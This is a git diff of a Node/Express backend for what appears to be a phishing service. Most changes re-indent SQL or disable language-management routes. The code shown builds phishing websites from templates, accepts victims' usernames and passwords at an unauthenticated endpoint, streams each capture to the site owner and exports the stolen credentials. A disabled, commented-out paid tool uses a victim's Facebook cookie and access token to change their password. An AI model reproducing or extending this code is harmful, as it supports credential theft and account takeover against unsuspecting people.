-      errorMessage = 'External API returned invalid response format. Please try again later.';
-      statusCode = 502; // Bad Gateway
-    } else if (error.message.includes('Insufficient')) {
-      errorMessage = error.message;
-      statusCode = 400;
-    }
-
-    res.status(statusCode).json({
-      status: 'error',
-      message: errorMessage,
-      error: error.message,
-      timestamp: new Date().toISOString()
-    });
-  }
+  res.status(404).json({
+    status: 'error',
+    message: 'Tools feature has been disabled'
+  });
 });
 
 app.post('/api/tools/change-pass/change-password', authenticateToken, async (req, res) => {
+  return res.status(404).json({ status: 'error', message: 'Tools feature has been disabled' });
+  /*
   try {
     const { cookie, access_token, new_password, payment_method = 'points' } = req.body;
     const userId = req.user.id;
-
+  
     if (!cookie || !access_token || !new_password) {
       return res.status(400).json({
         status: 'error',
         message: 'Cookie, access token, and new password are required'
       });
     }
-
+  
     // Find the change-pass tool
     const toolResult = await executeQuery(`
       SELECT id, name, points_cost, price FROM tools 
       WHERE url LIKE '%change-pass%' OR name LIKE '%change-pass%'
     `);
-
+  
     if (!toolResult.success || toolResult.data.length === 0) {
       return res.status(404).json({
         status: 'error',
         message: 'Change-pass tool not found'
       });
     }
-
+  
     const tool = toolResult.data[0];
-
+  
     // Check if user has enough points/balance
     const userResult = await executeQuery(`
       SELECT points, balance FROM users WHERE id = ?
     `, [userId]);
-
+  
     if (!userResult.success || userResult.data.length === 0) {
       return res.status(400).json({
         status: 'error',
         message: 'User not found'
       });
     }
-
+  
     const user = userResult.data[0];
-
+  
     // Check payment method and validate accordingly
     // Priority: 1. Money (balance), 2. Points
     if (payment_method === 'money') {
@@ -4191,15 +3530,15 @@ app.post('/api/tools/change-pass/change-password', authenticateToken, async (req
         req.body.payment_method = 'money';
       }
     }
-
+  
     // Use local Facebook password changer implementation
     console.log('=== LOCAL FACEBOOK PASSWORD CHANGER (CHANGE-PASSWORD) ===');
     console.log('Using local implementation instead of external API');
-
+  
     let data;
     try {
       // const changer = new FacebookPasswordChanger(cookie, access_token);
-
+  
       // Step 1: Get code
       console.log('Step 1: Getting verification code');
       // const code = await changer.getCode();
@@ -4208,7 +3547,7 @@ app.post('/api/tools/change-pass/change-password', authenticateToken, async (req
         throw new Error('Failed to get verification code - Facebook password changer not available');
       }
       console.log('Verification code obtained:', code ? { code_length: code.length } : 'no code');
-
+  
       // Step 2: Get form data
       console.log('Step 2: Getting form data');
       // const formData = await changer.checkUrlChangePass(code);
@@ -4217,20 +3556,20 @@ app.post('/api/tools/change-pass/change-password', authenticateToken, async (req
         throw new Error('Failed to get form data');
       }
       console.log('Form data obtained:', { has_fb_dtsg: !!formData.fb_dtsg });
-
+  
       // Step 3: Change password
       console.log('Step 3: Changing password');
       // const success = await changer.changePassword(formData, new_password);
       const success = false;
       console.log('Password change result:', { success });
-
+  
       data = {
         success: success,
         message: success ? 'Password changed successfully' : 'Failed to change password - module not available',
         code: code || null,
         logs: []
       };
-
+  
     } catch (error) {
       console.error('Local implementation error:', error);
       data = {
@@ -4239,7 +3578,7 @@ app.post('/api/tools/change-pass/change-password', authenticateToken, async (req
         logs: []
       };
     }
-
+  
     if (data.success) {
       // Deduct points/balance from user based on payment method
       if (payment_method === 'points') {
@@ -4248,7 +3587,7 @@ app.post('/api/tools/change-pass/change-password', authenticateToken, async (req
           SET points = points - ?, updated_at = NOW()
           WHERE id = ?
         `, [tool.points_cost, userId]);
-
+  
         // Record the points transaction
         await executeQuery(`
           INSERT INTO user_points_transactions (user_id, points_change, reason, reference_type, reference_id)
@@ -4260,27 +3599,27 @@ app.post('/api/tools/change-pass/change-password', authenticateToken, async (req
           SET balance = balance - ?, updated_at = NOW()
           WHERE id = ?
         `, [tool.price, userId]);
-
+  
         // Record the money transaction
         await executeQuery(`
           INSERT INTO transaction_history (user_id, transaction_type, amount, balance_before, balance_after, description, reference_id)
           VALUES (?, 'product_purchase', ?, ?, ?, ?, ?)
         `, [userId, -parseFloat(tool.price), parseFloat(user.balance), parseFloat(user.balance) - parseFloat(tool.price), `Used ${tool.name} - Change Password`, tool.id]);
       }
-
+  
       // Track tool usage
       await executeQuery(`
         INSERT INTO tool_usage (user_id, tool_id, used_at, session_duration, success, notes)
         VALUES (?, ?, NOW(), 0, true, 'Password changed successfully')
       `, [userId, tool.id]);
-
+  
       // Update tool usage count
       await executeQuery(`
         UPDATE tools 
         SET usage_count = usage_count + 1, updated_at = NOW()
         WHERE id = ?
       `, [tool.id]);
-
+  
       res.json({
         status: 'success',
         message: 'Password changed successfully',
@@ -4298,11 +3637,11 @@ app.post('/api/tools/change-pass/change-password', authenticateToken, async (req
     }
   } catch (error) {
     console.error('Change password error:', error);
-
+  
     // Provide more specific error messages based on error type
     let errorMessage = 'Internal server error';
     let statusCode = 500;
-
+  
     if (error.message.includes('API request failed')) {
       errorMessage = 'External API is currently unavailable. Please try again later.';
       statusCode = 503; // Service Unavailable
@@ -4316,7 +3655,7 @@ app.post('/api/tools/change-pass/change-password', authenticateToken, async (req
       errorMessage = error.message;
       statusCode = 400;
     }
-
+  
     res.status(statusCode).json({
       status: 'error',
       message: errorMessage,
@@ -4324,501 +3663,46 @@ app.post('/api/tools/change-pass/change-password', authenticateToken, async (req
       timestamp: new Date().toISOString()
     });
   }
+    */
 });
 
 // Language Management API endpoints
 
-// Get all languages
+// Language Management API endpoints - Disabled
 app.get('/api/admin/languages', authenticateAdmin, async (req, res) => {
-  try {
-    const { page = 1, limit = 10, search = '', status = 'all' } = req.query;
-    const offset = (page - 1) * limit;
-
-    // Build WHERE conditions
-    let whereConditions = [];
-    let queryParams = [];
-
-    // Search condition
-    if (search && search.trim()) {
-      whereConditions.push('(code LIKE ? OR name LIKE ? OR native_name LIKE ?)');
-      const searchTerm = `%${search.trim()}%`;
-      queryParams.push(searchTerm, searchTerm, searchTerm);
-    }
-
-    // Status condition
-    if (status === 'active') {
-      whereConditions.push('is_active = ?');
-      queryParams.push(true);
-    } else if (status === 'inactive') {
-      whereConditions.push('is_active = ?');
-      queryParams.push(false);
-    }
-
-    const whereClause = whereConditions.length > 0 ? `WHERE ${whereConditions.join(' AND ')}` : '';
-
-    // Get total count
-    const countQuery = `SELECT COUNT(*) as total FROM languages ${whereClause}`;
-    const countParams = queryParams.length > 0 ? queryParams : [];
-    const countResult = await executeQuery(countQuery, countParams);
-
-    if (!countResult.success) {
-      return res.status(500).json({
-        status: 'error',
-        message: 'Failed to count languages',
-        error: countResult.error
-      });
-    }
-
-    const totalLanguages = countResult.data[0].total;
-
-    // Get languages with pagination
-    const languagesQuery = `
-      SELECT * FROM languages 
-      ${whereClause}
-      ORDER BY created_at DESC 
-      LIMIT ${parseInt(limit)} OFFSET ${parseInt(offset)}
-    `;
-    const languagesResult = await executeQuery(languagesQuery, queryParams);
-
-    if (languagesResult.success) {
-      res.json({
-        status: 'success',
-        data: {
-          languages: languagesResult.data,
-          pagination: {
-            page: parseInt(page),
-            limit: parseInt(limit),
-            total: totalLanguages,
-            pages: Math.ceil(totalLanguages / limit)
-          }
-        }
-      });
-    } else {
-      res.status(500).json({
-        status: 'error',
-        message: 'Failed to fetch languages',
-        error: languagesResult.error
-      });
-    }
-  } catch (error) {
-    console.error('Get languages error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Failed to fetch languages',
-      error: error.message
-    });
-  }
+  res.status(404).json({ status: 'error', message: 'Language feature has been disabled' });
 });
 
-// Get language by code
 app.get('/api/admin/languages/:code', authenticateAdmin, async (req, res) => {
-  try {
-    const { code } = req.params;
-
-    const result = await executeQuery(
-      'SELECT * FROM languages WHERE code = ?',
-      [code]
-    );
-
-    if (result.success && result.data.length > 0) {
-      res.json({
-        status: 'success',
-        data: result.data[0]
-      });
-    } else {
-      res.status(404).json({
-        status: 'error',
-        message: 'Language not found'
-      });
-    }
-  } catch (error) {
-    console.error('Get language error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Failed to fetch language',
-      error: error.message
-    });
-  }
+  res.status(404).json({ status: 'error', message: 'Language feature has been disabled' });
 });
 
-// Create new language
 app.post('/api/admin/languages', authenticateAdmin, async (req, res) => {
-  try {
-    const { code, name, nativeName, flag, isActive, isRTL } = req.body;
-
-    // Validate required fields
-    if (!code || !name) {
-      return res.status(400).json({
-        status: 'error',
-        message: 'Language code and name are required'
-      });
-    }
-
-    // Check if language code already exists
-    const existingResult = await executeQuery(
-      'SELECT id FROM languages WHERE code = ?',
-      [code]
-    );
-
-    if (existingResult.success && existingResult.data.length > 0) {
-      return res.status(400).json({
-        status: 'error',
-        message: 'Language code already exists'
-      });
-    }
-
-    const result = await executeQuery(`
-      INSERT INTO languages (code, name, native_name, flag, is_active, is_rtl, created_at, updated_at)
-      VALUES (?, ?, ?, ?, ?, ?, NOW(), NOW())
-    `, [code, name, nativeName || name, flag || '', isActive !== false, isRTL || false]);
-
-    if (result.success) {
-      res.status(201).json({
-        status: 'success',
-        message: 'Language created successfully',
-        data: { id: result.data.insertId }
-      });
-    } else {
-      res.status(500).json({
-        status: 'error',
-        message: 'Failed to create language',
-        error: result.error
-      });
-    }
-  } catch (error) {
-    console.error('Create language error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Failed to create language',
-      error: error.message
-    });
-  }
+  res.status(404).json({ status: 'error', message: 'Language feature has been disabled' });
 });
 
-// Update language
 app.put('/api/admin/languages/:code', authenticateAdmin, async (req, res) => {
-  try {
-    const { code } = req.params;
-    const { name, nativeName, flag, isActive, isRTL } = req.body;
-
-    // Validate required fields
-    if (!name) {
-      return res.status(400).json({
-        status: 'error',
-        message: 'Language name is required'
-      });
-    }
-
-    const result = await executeQuery(`
-      UPDATE languages 
-      SET name = ?, native_name = ?, flag = ?, is_active = ?, is_rtl = ?, updated_at = NOW()
-      WHERE code = ?
-    `, [name, nativeName || name, flag || '', isActive !== false, isRTL || false, code]);
-
-    if (result.success) {
-      if (result.data.affectedRows > 0) {
-        res.json({
-          status: 'success',
-          message: 'Language updated successfully'
-        });
-      } else {
-        res.status(404).json({
-          status: 'error',
-          message: 'Language not found'
-        });
-      }
-    } else {
-      res.status(500).json({
-        status: 'error',
-        message: 'Failed to update language',
-        error: result.error
-      });
-    }
-  } catch (error) {
-    console.error('Update language error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Failed to update language',
-      error: error.message
-    });
-  }
+  res.status(404).json({ status: 'error', message: 'Language feature has been disabled' });
 });
 
-// Delete language
 app.delete('/api/admin/languages/:code', authenticateAdmin, async (req, res) => {
-  try {
-    const { code } = req.params;
-
-    // Check if language is in use (you might want to add this check)
-    // For now, we'll allow deletion
-
-    const result = await executeQuery(
-      'DELETE FROM languages WHERE code = ?',
-      [code]
-    );
-
-    if (result.success) {
-      if (result.data.affectedRows > 0) {
-        // Also delete translations for this language
-        await executeQuery(
-          'DELETE FROM language_translations WHERE language_code = ?',
-          [code]
-        );
-
-        res.json({
-          status: 'success',
-          message: 'Language deleted successfully'
-        });
-      } else {
-        res.status(404).json({
-          status: 'error',
-          message: 'Language not found'
-        });
-      }
-    } else {
-      res.status(500).json({
-        status: 'error',
-        message: 'Failed to delete language',
-        error: result.error
-      });
-    }
-  } catch (error) {
-    console.error('Delete language error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Failed to delete language',
-      error: error.message
-    });
-  }
+  res.status(404).json({ status: 'error', message: 'Language feature has been disabled' });
 });
 
-// Get translations for a language
 app.get('/api/admin/languages/:code/translations', authenticateAdmin, async (req, res) => {
-  try {
-    const { code } = req.params;
-
-    console.log('🔍 GET translations request for language:', code);
-
-    const result = await executeQuery(
-      'SELECT translation_key, translation_value FROM language_translations WHERE language_code = ?',
-      [code]
-    );
-
-    console.log('📊 Query result:', result.success ? 'success' : 'failed');
-    console.log('📊 Number of translations found:', result.data?.length || 0);
-
-    if (result.success) {
-      // Convert array to object
-      const translations = {};
-      result.data.forEach(row => {
-        translations[row.translation_key] = row.translation_value;
-      });
-
-      console.log('📝 Translations object keys:', Object.keys(translations).length);
-      console.log('📝 Sample translations:', Object.entries(translations).slice(0, 3));
-
-      res.json({
-        status: 'success',
-        data: { translations }
-      });
-    } else {
-      console.log('❌ Query failed:', result.error);
-      res.status(500).json({
-        status: 'error',
-        message: 'Failed to fetch translations',
-        error: result.error
-      });
-    }
-  } catch (error) {
-    console.error('Get translations error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Failed to fetch translations',
-      error: error.message
-    });
-  }
+  res.status(404).json({ status: 'error', message: 'Language feature has been disabled' });
 });
 
-// Save translations for a language
 app.post('/api/admin/languages/:code/translations', authenticateAdmin, async (req, res) => {
-  try {
-    const { code } = req.params;
-    const { translations } = req.body;
-
-    console.log('🔍 Save translations request:', { code, translations });
-    console.log('🔍 Request body:', req.body);
-    console.log('🔍 User from auth:', req.user);
-
-    // Check current translations before save
-    const beforeCount = await executeQuery('SELECT COUNT(*) as total FROM language_translations WHERE language_code = ?', [code]);
-    console.log('📊 Translations before save:', beforeCount.data[0].total);
-
-    // Show current translations
-    const currentTranslations = await executeQuery('SELECT translation_key, translation_value FROM language_translations WHERE language_code = ?', [code]);
-    console.log('📝 Current translations in database:', currentTranslations.data.length);
-    console.log('📝 Sample current translations:', currentTranslations.data.slice(0, 3));
-
-    if (!translations || typeof translations !== 'object') {
-      console.log('❌ Invalid translations object:', translations);
-      return res.status(400).json({
-        status: 'error',
-        message: 'Translations object is required'
-      });
-    }
-
-    // Safety check: Don't save if translations object is empty
-    const translationEntries = Object.entries(translations);
-    if (translationEntries.length === 0) {
-      console.log('❌ Cannot save: translations object is empty!');
-      return res.status(400).json({
-        status: 'error',
-        message: 'Cannot save: No translations provided. Translations object is empty.'
-      });
-    }
-
-    // Use INSERT ... ON DUPLICATE KEY UPDATE instead of DELETE + INSERT
-    console.log('📝 Translation entries to save:', translationEntries.length);
-
-    if (translationEntries.length > 0) {
-      // Process each translation individually to handle updates properly
-      for (const [key, value] of translationEntries) {
-        console.log('💾 Saving translation:', { key, value });
-
-        const upsertResult = await executeQuery(`
-          INSERT INTO language_translations (language_code, translation_key, translation_value)
-          VALUES (?, ?, ?)
-          ON DUPLICATE KEY UPDATE
-          translation_value = VALUES(translation_value),
-          updated_at = CURRENT_TIMESTAMP
-        `, [code, key, value]);
-
-        console.log('✅ Upsert result for', key, ':', upsertResult);
-      }
-    }
-
-    // Check translations after save
-    const afterCount = await executeQuery('SELECT COUNT(*) as total FROM language_translations WHERE language_code = ?', [code]);
-    console.log('📊 Translations after save:', afterCount.data[0].total);
-
-    // Show translations after save
-    const afterTranslations = await executeQuery('SELECT translation_key, translation_value FROM language_translations WHERE language_code = ?', [code]);
-    console.log('📝 Translations after save in database:', afterTranslations.data.length);
-    console.log('📝 Sample translations after save:', afterTranslations.data.slice(0, 3));
-
-    res.json({
-      status: 'success',
-      message: 'Translations saved successfully'
-    });
-  } catch (error) {
-    console.error('Save translations error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Failed to save translations',
-      error: error.message
-    });
-  }
+  res.status(404).json({ status: 'error', message: 'Language feature has been disabled' });
 });
 
-// Export translations for a language
 app.get('/api/admin/languages/:code/export', authenticateAdmin, async (req, res) => {
-  try {
-    const { code } = req.params;
-
-    const result = await executeQuery(
-      'SELECT translation_key, translation_value FROM language_translations WHERE language_code = ?',
-      [code]
-    );
-
-    if (result.success) {
-      // Convert array to object
-      const translations = {};
-      result.data.forEach(row => {
-        translations[row.translation_key] = row.translation_value;
-      });
-
-      // Set headers for file download
-      res.setHeader('Content-Type', 'application/json');
-      res.setHeader('Content-Disposition', `attachment; filename="${code}_translations.json"`);
-
-      res.json(translations);
-    } else {
-      res.status(500).json({
-        status: 'error',
-        message: 'Failed to export translations',
-        error: result.error
-      });
-    }
-  } catch (error) {
-    console.error('Export translations error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Failed to export translations',
-      error: error.message
-    });
-  }
+  res.status(404).json({ status: 'error', message: 'Language feature has been disabled' });
 });
 
-// Import translations for a language
 app.post('/api/admin/languages/:code/import', authenticateAdmin, upload.single('file'), async (req, res) => {
-  try {
-    const { code } = req.params;
-
-    if (!req.file) {
-      return res.status(400).json({
-        status: 'error',
-        message: 'No file uploaded'
-      });
-    }
-
-    // Read and parse the uploaded file
-    const filePath = req.file.path;
-    const fileContent = fs.readFileSync(filePath, 'utf8');
-    const translations = JSON.parse(fileContent);
-
-    if (typeof translations !== 'object') {
-      return res.status(400).json({
-        status: 'error',
-        message: 'Invalid translations file format'
-      });
-    }
-
-    // Use INSERT ... ON DUPLICATE KEY UPDATE instead of DELETE + INSERT
-    const translationEntries = Object.entries(translations);
-    console.log('📝 Translation entries to import:', translationEntries.length);
-
-    if (translationEntries.length > 0) {
-      // Process each translation individually to handle updates properly
-      for (const [key, value] of translationEntries) {
-        console.log('💾 Importing translation:', { key, value });
-
-        const upsertResult = await executeQuery(`
-          INSERT INTO language_translations (language_code, translation_key, translation_value)
-          VALUES (?, ?, ?)
-          ON DUPLICATE KEY UPDATE
-          translation_value = VALUES(translation_value),
-          updated_at = CURRENT_TIMESTAMP
-        `, [code, key, value]);
-
-        console.log('✅ Upsert result for', key, ':', upsertResult);
-      }
-    }
-
-    // Clean up uploaded file
-    fs.unlinkSync(filePath);
-
-    res.json({
-      status: 'success',
-      message: 'Translations imported successfully',
-      data: { translations }
-    });
-  } catch (error) {
-    console.error('Import translations error:', error);
-    res.status(500).json({
-      status: 'error',
-      message: 'Failed to import translations',
-      error: error.message
-    });
-  }
+  res.status(404).json({ status: 'error', message: 'Language feature has been disabled' });
 });
 
 // ============================================================================
@@ -4846,15 +3730,15 @@ app.get('/api/phishing/websites', authenticateUser, async (req, res) => {
     }
 
     const result = await executeQuery(`
-      SELECT * FROM websites 
-      ${whereClause}
-      ORDER BY created_at DESC 
-      LIMIT ${parseInt(limit)} OFFSET ${parseInt(offset)}
-    `, queryParams);
+    SELECT * FROM websites 
+    ${whereClause}
+    ORDER BY created_at DESC 
+    LIMIT ${parseInt(limit)} OFFSET ${parseInt(offset)}
+  `, queryParams);
 
     const countResult = await executeQuery(`
-      SELECT COUNT(*) as total FROM websites ${whereClause}
-    `, queryParams);
+    SELECT COUNT(*) as total FROM websites ${whereClause}
+  `, queryParams);
 
     if (!result.success) {
       return res.status(500).json({
@@ -4976,12 +3860,12 @@ app.post('/api/phishing/websites', authenticateUser, strictRateLimiter(), async 
       // Try insert with template IDs
       console.log('🔄 Inserting with template IDs...');
       insertResult = await executeQuery(`
-        INSERT INTO websites (
-          title, description, slug, redirect_url, temp1, temp2, 
-          phishing_template_id, login_template_id, 
-          thumbnail, language, domain, user_id
-        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-      `, [
+      INSERT INTO websites (
+        title, description, slug, redirect_url, temp1, temp2, 
+        phishing_template_id, login_template_id, 
+        thumbnail, language, domain, user_id
+      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    `, [
         websiteData.title, websiteData.description, websiteData.slug,
         websiteData.redirect_url, websiteData.temp1, websiteData.temp2,
         websiteData.phishing_template_id, websiteData.login_template_id,
@@ -4992,11 +3876,11 @@ app.post('/api/phishing/websites', authenticateUser, strictRateLimiter(), async 
       // Use fallback schema
       console.log('🔄 Inserting with legacy schema (no template IDs)...');
       insertResult = await executeQuery(`
-        INSERT INTO websites (
-          title, description, slug, redirect_url, temp1, temp2, 
-          thumbnail, language, domain, user_id
-        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-      `, [
+      INSERT INTO websites (
+        title, description, slug, redirect_url, temp1, temp2, 
+        thumbnail, language, domain, user_id
+      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+    `, [
         websiteData.title, websiteData.description, websiteData.slug,
         websiteData.redirect_url, websiteData.temp1, websiteData.temp2,
         websiteData.thumbnail, websiteData.language, websiteData.domain,
@@ -5022,9 +3906,9 @@ app.post('/api/phishing/websites', authenticateUser, strictRateLimiter(), async 
       const ipAddress = req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.ip;
       const userAgent = req.headers['user-agent'] || '';
       await executeQuery(`
-        INSERT INTO activities (user_id, username, type, action, description, metadata, ip_address, user_agent)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-      `, [
+      INSERT INTO activities (user_id, username, type, action, description, metadata, ip_address, user_agent)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+    `, [
         userId,
         req.user.username,
         'website_created',
@@ -5458,17 +4342,17 @@ app.get('/api/phishing/accounts', authenticateUser, async (req, res) => {
     }
 
     const result = await executeQuery(`
-      SELECT al.*, w.title as website_title 
-      FROM account_list al
-      LEFT JOIN websites w ON al.website = w.id
-      ${whereClause}
-      ORDER BY al.created_at DESC 
-      LIMIT ? OFFSET ?
-    `, [...queryParams, Number(limit) || 10, Number(offset) || 0]);
+    SELECT al.*, w.title as website_title 
+    FROM account_list al
+    LEFT JOIN websites w ON al.website = w.id
+    ${whereClause}
+    ORDER BY al.created_at DESC 
+    LIMIT ? OFFSET ?
+  `, [...queryParams, Number(limit) || 10, Number(offset) || 0]);
 
     const countResult = await executeQuery(`
-      SELECT COUNT(*) as total FROM account_list al ${whereClause}
-    `, queryParams);
+    SELECT COUNT(*) as total FROM account_list al ${whereClause}
+  `, queryParams);
 
     res.json({
       status: 'success',
@@ -5518,9 +4402,9 @@ app.post('/api/phishing/accounts', async (req, res) => {
 
     // Insert account
     const result = await executeQuery(`
-      INSERT INTO account_list (username, password, website, user_id, ip_address, status)
-      VALUES (?, ?, ?, ?, ?, 'success')
-    `, [username, password, website.id, website.user_id, ip_address]);
+    INSERT INTO account_list (username, password, website, user_id, ip_address, status)
+    VALUES (?, ?, ?, ?, ?, 'success')
+  `, [username, password, website.id, website.user_id, ip_address]);
 
     if (result.success) {
       // Update website view count
@@ -5531,11 +4415,11 @@ app.post('/api/phishing/accounts', async (req, res) => {
 
       // Get the created account with website info for WebSocket broadcast
       const accountResult = await executeQuery(`
-        SELECT al.*, w.title as website_title, w.slug as website_slug
-        FROM account_list al
-        LEFT JOIN websites w ON al.website = w.id
-        WHERE al.id = ?
-      `, [result.data.insertId]);
+      SELECT al.*, w.title as website_title, w.slug as website_slug
+      FROM account_list al
+      LEFT JOIN websites w ON al.website = w.id
+      WHERE al.id = ?
+    `, [result.data.insertId]);
 
       // Broadcast to user-specific Pusher channel
       if (accountResult.data.length > 0) {
@@ -5552,9 +4436,9 @@ app.post('/api/phishing/accounts', async (req, res) => {
         // Log activity
         try {
           await executeQuery(`
-            INSERT INTO activities (user_id, username, type, action, description, metadata, ip_address, user_agent)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-          `, [
+          INSERT INTO activities (user_id, username, type, action, description, metadata, ip_address, user_agent)
+          VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+        `, [
             website.user_id,
             req.user?.username || 'System',
             'account_captured',
@@ -5726,21 +4610,21 @@ app.get('/api/phishing/accounts/export', authenticateUser, async (req, res) => {
     }
 
     const result = await executeQuery(`
-      SELECT 
-        al.id,
-        al.username,
-        al.password,
-        al.email,
-        al.ip_address,
-        al.status,
-        al.code,
-        al.created_at,
-        w.title as website_title
-      FROM account_list al
-      LEFT JOIN websites w ON al.website = w.id
-      ${whereClause}
-      ORDER BY al.created_at DESC
-    `, queryParams);
+    SELECT 
+      al.id,
+      al.username,
+      al.password,
+      al.email,
+      al.ip_address,
+      al.status,
+      al.code,
+      al.created_at,
+      w.title as website_title
+    FROM account_list al
+    LEFT JOIN websites w ON al.website = w.id
+    ${whereClause}
+    ORDER BY al.created_at DESC
+  `, queryParams);
 
     if (!result.success) {
       return res.status(500).json({
@@ -5804,12 +4688,12 @@ app.post('/api/templates/clone/:id', authenticateUser, async (req, res) => {
     // Create new template with cloned content
     const newTemplateName = name || `${template.name} (Copy)`;
     const cloneResult = await executeQuery(`
-      INSERT INTO templates (
-        name, description, thumbnail, type, content_html, content_css, content_js, 
-        is_active, is_shared, approval_status, created_by
-      )
-      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-    `, [
+    INSERT INTO templates (
+      name, description, thumbnail, type, content_html, content_css, content_js, 
+      is_active, is_shared, approval_status, created_by
+    )
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+  `, [
       newTemplateName,
       template.description,
       template.thumbnail,
@@ -5842,12 +4726,12 @@ app.post('/api/templates/clone/:id', authenticateUser, async (req, res) => {
       // Insert each field for the new template
       for (const field of fieldsResult.data) {
         await executeQuery(`
-          INSERT INTO template_fields (
-            template_id, field_name, field_type, field_label, field_placeholder,
-            max_length, is_required, field_order
-          )
-          VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-        `, [
+        INSERT INTO template_fields (
+          template_id, field_name, field_type, field_label, field_placeholder,
+          max_length, is_required, field_order
+        )
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+      `, [
           newTemplateId,
           field.field_name,
           field.field_type,
@@ -5958,11 +4842,11 @@ app.get('/api/admin/templates', authenticateUser, async (req, res) => {
     }
 
     const result = await executeQuery(`
-      SELECT t.*, u.username as created_by_name
-      FROM templates t
-      LEFT JOIN users u ON t.created_by = u.id
-      ORDER BY t.created_at DESC
-    `);
+    SELECT t.*, u.username as created_by_name
+    FROM templates t
+    LEFT JOIN users u ON t.created_by = u.id
+    ORDER BY t.created_at DESC
+  `);
 
     if (result.success) {
       res.json({
@@ -6004,9 +4888,9 @@ app.post('/api/admin/templates', authenticateUser, async (req, res) => {
     }
 
     const result = await executeQuery(`
-      INSERT INTO templates (name, description, thumbnail, type, content_html, content_css, content_js, is_active, created_by)
-      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
-    `, [name, description, thumbnail, type, content_html, content_css, content_js, is_active, createdBy]);
+    INSERT INTO templates (name, description, thumbnail, type, content_html, content_css, content_js, is_active, created_by)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+  `, [name, description, thumbnail, type, content_html, content_css, content_js, is_active, createdBy]);
 
     if (result.success) {
       res.json({
@@ -6049,10 +4933,10 @@ app.put('/api/admin/templates/:id', authenticateUser, async (req, res) => {
     }
 
     const result = await executeQuery(`
-      UPDATE templates 
-      SET name = ?, description = ?, thumbnail = ?, type = ?, content_html = ?, content_css = ?, content_js = ?, is_active = ?
-      WHERE id = ?
-    `, [name, description, thumbnail, type, content_html, content_css, content_js, is_active, id]);
+    UPDATE templates 
+    SET name = ?, description = ?, thumbnail = ?, type = ?, content_html = ?, content_css = ?, content_js = ?, is_active = ?
+    WHERE id = ?
+  `, [name, description, thumbnail, type, content_html, content_css, content_js, is_active, id]);
 
     if (result.success) {
       res.json({
@@ -6121,11 +5005,11 @@ app.get('/api/admin/templates/:id', authenticateUser, async (req, res) => {
     const { id } = req.params;
 
     const result = await executeQuery(`
-      SELECT t.*, u.username as created_by_name
-      FROM templates t
-      LEFT JOIN users u ON t.created_by = u.id
-      WHERE t.id = ?
-    `, [id]);
+    SELECT t.*, u.username as created_by_name
+    FROM templates t
+    LEFT JOIN users u ON t.created_by = u.id
+    WHERE t.id = ?
+  `, [id]);
 
     if (result.success) {
       if (result.data.length === 0) {
@@ -6232,14 +5116,14 @@ app.post('/api/upload/website-thumbnail', authenticateUser, moderateRateLimiter(
 app.get('/api/templates/public', async (req, res) => {
   try {
     const result = await executeQuery(`
-      SELECT t.*, u.username as created_by_name
-      FROM templates t
-      LEFT JOIN users u ON t.created_by = u.id
-      WHERE t.is_active = 1 
-        AND t.approval_status = 'approved'
-        AND t.is_shared = 1
-      ORDER BY t.created_at DESC
-    `);
+    SELECT t.*, u.username as created_by_name
+    FROM templates t
+    LEFT JOIN users u ON t.created_by = u.id
+    WHERE t.is_active = 1 
+      AND t.approval_status = 'approved'
+      AND t.is_shared = 1
+    ORDER BY t.created_at DESC
+  `);
 
     if (result.success) {
       res.json({
@@ -6267,12 +5151,12 @@ app.get('/api/templates/my-templates', authenticateUser, async (req, res) => {
     const userId = req.user.id;
 
     const result = await executeQuery(`
-      SELECT t.*, u.username as created_by_name
-      FROM templates t
-      LEFT JOIN users u ON t.created_by = u.id
-      WHERE t.created_by = ?
-      ORDER BY t.created_at DESC
-    `, [userId]);
+    SELECT t.*, u.username as created_by_name
+    FROM templates t
+    LEFT JOIN users u ON t.created_by = u.id
+    WHERE t.created_by = ?
+    ORDER BY t.created_at DESC
+  `, [userId]);
 
     if (result.success) {
       res.json({
@@ -6301,14 +5185,14 @@ app.get('/api/templates/:id', authenticateUser, async (req, res) => {
     const userId = req.user.id;
 
     const result = await executeQuery(`
-      SELECT t.*, u.username as created_by_name
-      FROM templates t
-      LEFT JOIN users u ON t.created_by = u.id
-      WHERE t.id = ? AND (
-        t.created_by = ? OR 
-        (t.is_shared = 1 AND t.approval_status = 'approved')
-      )
-    `, [id, userId]);
+    SELECT t.*, u.username as created_by_name
+    FROM templates t
+    LEFT JOIN users u ON t.created_by = u.id
+    WHERE t.id = ? AND (
+      t.created_by = ? OR 
+      (t.is_shared = 1 AND t.approval_status = 'approved')
+    )
+  `, [id, userId]);
 
     if (result.success) {
       if (result.data.length === 0) {
@@ -6360,12 +5244,12 @@ app.post('/api/templates/create', authenticateUser, strictRateLimiter(), async (
     }
 
     const result = await executeQuery(`
-      INSERT INTO templates (
-        name, description, thumbnail, type, content_html, content_css, content_js, 
-        is_active, is_shared, approval_status, submitted_for_approval_at, created_by
-      )
-      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-    `, [
+    INSERT INTO templates (
+      name, description, thumbnail, type, content_html, content_css, content_js, 
+      is_active, is_shared, approval_status, submitted_for_approval_at, created_by
+    )
